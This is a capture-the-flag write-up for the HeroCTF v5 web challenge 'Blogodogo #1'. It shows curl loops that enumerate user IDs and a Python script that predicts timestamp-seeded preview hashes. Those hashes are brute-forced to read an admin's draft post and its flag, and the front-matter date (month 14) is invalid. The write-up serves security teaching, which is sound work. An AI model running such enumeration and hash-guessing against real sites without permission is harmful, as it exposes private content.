---
title: "[Medium][HeroCTF v5][Web] Blogodogo #1"
date: "2023-14-13"
categories: [ "CTF", "HeroCTF v5", "Web" ]
tags: [ "Weak Random Secret", "Enumeration" ]
slug: "blogodogo-1"
ShowToc: false
draft: false
weight: 4
---

## Introduction

Try to access the content of the admin user's secret note.

For this challenge, we have access to the source code, which is available on my GitHub: [Blogodogo Sources](https://github.com/mxcezl/HeroCTF-v5-Sources/tree/main/Web/Blogodogo/Blogodogo%20Sources)

## Solution

The challenge is a blog with authentication.

On the homepage, we can see several posts from different users, and in the header, it says `A community of 8 authors`.

![Blogodogo](/images/heroctfv5/web/blog_home.png)

By clicking on the name of one user, for example, `lolo`, who is the author of the first article, we are taken to the user's profile page.

> Non-essential note for exploiting the challenge: After launching multiple instances, I realized that the 8 users are always the same: admin, bob, alice, and 5 other random users (lolo, tata, toto, ...).

![Blogodogo](/images/heroctfv5/web/blog_profile.png)

The URL of this page is `/author/:id`, where `:id` is the user's ID.

Here, the user `lolo` has the ID `23`.

By making a curl request to the `/author/0` endpoint, we can see in the response that there is a redirection because the user was not found.

```bash
curl 'http://dyn-01.heroctf.fr:10471/author/0'
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

On the other hand, a curl request to the `/author/23` endpoint gives us the profile of the user `lolo`.

```bash
curl 'http://dyn-01.heroctf.fr:10471/author/23'
[...]
<!-- Page Header-->
<header class="masthead" style="background-image: url('/static/assets/img/about-bg.jpg')">
    <div class="container position-relative px-4 px-lg-5">
        <div class="row gx-4 gx-lg-5 justify-content-center">
            <div class="col-md-10 col-lg-8 col-xl-7">
                <div class="page-heading">
                    <h1>lolo</h1>

                        <span class="subheading">Content writer</span>

                </div>
            </div>
        </div>
    </div>
</header>
[...]
```

Based on this information, I performed several commands to test the authors' IDs from 0 to 50 and display a result if the user exists.

```bash
for id in {0..50}; do response=$(curl -s "http://dyn-01.heroctf.fr:10471/author/$id"); [[ "$response" != *"Redirecting..."* ]] && username=$(echo "$response" | grep -oP '(?<=<h1>).*(?=<\/h1>)') && echo "Username: $username | ID: $id"; done

Username: admin | ID: 17
Username: bob | ID: 18
Username: alice | ID: 19
Username:john | ID: 20
Username: doggo | ID: 21
Username: toto | ID: 22
Username: lolo | ID: 23
Username: tata | ID: 24
```

We found the user `admin` with the ID `17` accessible at the URL `/author/17`.

Now, we might be able to find the flag in the profile of the user `admin` since on a user's profile page, we can see their posts.

![Blogodogo admin profile](/images/heroctfv5/web/blog_admin_profile.png)
![Blogodogo admin profile draft](/images/heroctfv5/web/blog_admin_profile_draft.png)

Bingo! We see the post `Secret blog post (draft)` with the description: `Secret post!!`

Unfortunately, clicking on the post gives us an error message: `You cannot view the drafts of other users`.

![Blogodogo admin profile draft 404](/images/heroctfv5/web/blog_error_draft.png)

Looking into the provided challenge sources, I tried to understand how post display is handled.

I found this function in the `routes.py` file:

```python
@bp_routes.route("/post/<string:slug>", methods=["GET"])
def view_post(slug):
    post = Posts.query.filter(Posts.slug == slug).first()

    if not post:
        flash("This post does not exist.", "warning")
        return redirect(url_for('bp_routes.index'))

    if post.draft and (not current_user.is_authenticated or post.author_id != current_user.id):
        flash("You cannot see drafts of other users.", "warning")
        return redirect(url_for('bp_routes.index'))

    author = Authors.query.filter_by(id=post.author_id).first()
    return render_template("pages/post.html", title="View a post", post=post, author=author)
```

We can see that if the post is a draft and the user is not authenticated or the user is not the author of the post, we are redirected to the homepage.

Therefore, on this endpoint, we must be authenticated and be the author of the post to be able to view it. This means we need to be admin to see the post.

After spending an evening trying to find a way to access the admin account, I reconsidered the challenge description:

> Try to access the content of the admin user's secret note.

For me, the flag is in the post `Secret blog post (draft)` since we are in challenge `Blogodogo 1/2`, and the challenge `Blogodogo 2/2` would be to find a way to access the admin account (that's my thoughts).

So I looked for a way to view the content of the post without using the `/post/:slug` endpoint and without needing to be logged in.

Digging into `routes.py`, I found this function:

```python
@bp_routes.route("/post/preview/<string:hash_preview>", methods=["GET"])
def preview_post(hash_preview):
    post = Posts.query.filter_by(hash_preview=hash_preview).first()

    if post:
        author = Authors.query.filter_by(id=post.author_id).first()
        return render_template("pages/post.html", title="Preview a post", post=post, author=author)

    flash("Unable to find the corresponding post.", "warning")
    return redirect(url_for('bp_routes.index'))
```

With this endpoint, we can view the content of a post by passing the post's hash as the `hash_preview` parameter.

To read the post `Secret blog post (draft)`, we need to find the hash of the post.

So, let's understand how the hash is generated. In the `routes.py` file, we have the `POST /add` route that allows creating a new post:

```python
@bp_routes.route("/add", methods=["GET", "POST"])
@login_required
def add_post():
    form = AddPostForm()
    if form.validate_on_submit():
        result = Posts.query.filter_by(slug=form.slug.data).first()
        if result:
            flash("Slug already exists.", "warning")
            return redirect(url_for('bp_routes.add_post'))

        post = Posts(
            title=form.title.data,
            subtitle=form.subtitle.data,
            slug=form.slug.data,
            content=form.content.data,
            draft=True,
            hash_preview=generate_hash(),
            author_id=current_user.id
        )
        db.session.add(post)
        db.session.commit()
        flash("Post successfully added.", "success")
        return redirect(url_for('bp_routes.view_post', slug=post.slug))

    return render_template("pages/add_post.html", title="Add a post", form=form)
```

We can see that the hash is generated by the `generate_hash()` function in `utils.py`:

```python
from datetime import datetime
from random import seed, randbytes

def generate_hash(timestamp=None):
    """Generate hash for post preview."""
    if timestamp:
        seed(timestamp)
    else:
        seed(int(datetime.now().timestamp()))

    return randbytes(32).hex()
```

When a post is created, the hash is generated using the `generate_hash()` function without any parameter, which means the hash is generated with the current timestamp.

A timestamp is a number that represents the number of seconds elapsed since January 1, 1970, at midnight UTC.

To generate the hash of the `Secret blog post (draft)`, we need to use the timestamp of the post's creation date, which is displayed on the admin user's profile page.

![Blogodogo admin profile draft](/images/heroctfv5/web/blog_admin_profile_draft.png)

The post was created on `2023-05-13` at `02:53`, but we don't know the exact time (missing seconds).

So, we need to test all the timestamps between `2023-05-13 02:53:00` and `2023-05-13 02:53:59` to find the correct one.

First, I converted the date to a timestamp using the website [https://www.epochconverter.com/](https://www.epochconverter.com/), which gave me `1683946380` for `2023-05-13 02:53:00`.

```
Epoch timestamp: 1683946380
Timestamp in milliseconds: 1683946380000
Date and time (GMT): Saturday 13 May 2023 02:53:00
```

Then, I wrote a Python script to test all the timestamps between `1683946380` and `1683946380 + 59`:

```python
epoch_secret_post_created = 1683946380
timestamp_list = [epoch_secret_post_created + n for n in range(60)]
```

Using these timestamps, I generated the corresponding hashes using the `generate_hash()` function from `utils.py`:

```python
[print(generate_hash(timestamp)) for timestamp in timestamp_list]
```

I copied the hashes into a file named `hashes.txt`.

```bash
$ python3 generate_hashes.py > hashes.txt
$ cat hashes.txt
8f2c71ce47d92eb5c185e22e6971343d4563f76bcb0557b94f693518a89dbd6b
326b66c2d792443c3e8b42b72d12de4c8479a7fb95397fb8b752ef5892063c39
1cfe4b77d1ca38b0a0214c7054227f09c81feafd402dacd63e19d4a11a821de2
43aa568512ee3bc7a811fb914f414d16943cabbe1965fe8ddaf6a3e97050bf33
[...] # 56 other hashes
```

Next, I used `curl` to test all the hashes:

```bash
for hash in $(cat hashes.txt); do response=$(curl -s "http://dyn-02.heroctf.fr:11192/post/preview/$hash"); [[ "$response" != *"Redirecting..."* ]] && echo "Found working hash: $hash"; done
```

This will iterate through each hash in `hashes.txt` and make a request to the preview endpoint. If the response doesn't contain the string "Redirecting...", it means we found a working hash.

Let's try to view the content of the `Secret blog post (draft)` using the hash `20030b5d29001f7856c0e7e034e00b8b715d24237f67cf2ea6ec34faee3bb08b`:

```bash	
curl -s "http://dyn-02.heroctf.fr:11192/post/preview/20030b5d29001f7856c0e7e034e00b8b715d24237f67cf2ea6ec34faee3bb08b"
[...]
<!-- Post Content-->
<article class="mb-4">
    <div class="container px-4 px-lg-5">
        <div class="row gx-4 gx-lg-5 justify-content-center">
            <div class="col-md-10 col-lg-8 col-xl-7">
                <p>
            Well played! You can now register users!

            Here is the referral code: 83d99a0ac225079db31b44a2e58b19f0.

            Hero{pr3333vi333wwwws_5973791}
            </p>
            </div>


            <hr class="mt-5">

            <h4>Report a post</h4>
[...]
```

We find the flag `Hero{pr3333vi333wwwws_5973791}`.

And the referral code `83d99a0ac225079db31b44a2e58b19f0` that allows us to register on the site for the next challenge, `Blogodogo #2`.

## Tips & Tricks

- Check all available routes as soon as you have access to the challenge's source code or if there is a swagger documentation.
- Always review hash creation functions, as most of the time, if it is poorly implemented, it can be easily cracked or reversed.
- Automate testing as soon as possible. In many cases, with a single bash command, you can achieve the equivalent of several hours of manual testing.